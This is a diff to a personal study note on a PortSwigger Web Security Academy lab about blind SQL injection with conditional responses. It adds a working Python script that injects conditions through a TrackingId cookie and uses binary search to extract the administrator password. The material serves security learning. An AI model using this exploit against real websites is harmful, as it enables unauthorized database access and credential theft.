@@ -1,7 +1,7 @@
 ---
 topic: SQL injection
-level: Apprentice
-time_spent: 2 hours
+level: Practitioner
+time_spent: 2.5 hours
 date: 24th Nov,2026
 ---
 
@@ -53,4 +53,65 @@ Cookie: TrackingId=sp6noqfqdKnsOAvQ' AND (SELECT SUBSTRING(password,1,1) FROM us
 
 - We can use binary search tree to tackle the same problem very easily and instead of 700 requests this can be done with around 100 requests.
 - So we use ASCII, we know from the hint that the password contains the small letters and the alphanumeric numbers which makes it more easier for us to find it and makes the process even faster.
-- We write a python script which contains the UR
+- We write a python script which contains the URL, the cookie and the Welcome back message we look up to as an boolean expression.
+- Other than that there is the binary search tree logic which we need.
+
+**Payload**:
+
+```
+import requests
+
+requests.packages.urllib3.disable_warnings()
+
+URL = "https://0aee00a204f5e31981671635006000c1.web-security-academy.net/"
+TRUE_STRING = "Welcome back"          
+BASE_TID = "sp6noqfqdKnsOAvQ"         # TrackingId
+
+def ask(condition):
+    payload = f"{BASE_TID}' AND {condition}-- -"
+    r = requests.get(URL, cookies={"TrackingId": payload},
+                     verify=False)
+    return TRUE_STRING in r.text
+
+def find_length():
+    lo, hi = 1, 50
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if ask(f"(SELECT LENGTH(password) FROM users WHERE username='administrator') > {mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo
+
+def find_char(pos):
+    lo, hi = 48, 122          
+    while lo < hi:
+        mid = (lo + hi) // 2
+        cond = (f"(SELECT ASCII(SUBSTRING(password,{pos},1)) "
+                f"FROM users WHERE username='administrator') > {mid}")
+        if ask(cond):
+            lo = mid + 1
+        else:
+            hi = mid
+    return chr(lo)
+
+# Checking the Oracle connection:
+assert ask("1=1") and not ask("1=2"), "Oracle broken — check URL/cookie/TRUE_STRING"
+print("[+] Oracle OK")
+
+length = find_length()
+print(f"[+] Password length: {length}")
+
+password = ""
+for pos in range(1, length + 1):
+    password += find_char(pos)
+    print(f"[{pos}/{length}] {password}")
+
+print(f"\n[+] administrator password: {password}")
+```
+
+- We knew the length of the password but still we have added that into the script because it makes this whole lab faster by hours.
+- And this is what the output looked like.
+![](Blind%20SQL%20injection%20with%20conditional%20responses.md_Attachments/-20261124-2.png)
+
+![](Blind%20SQL%20injection%20with%20conditional%20responses.md_Attachments/-20261124-3.png)
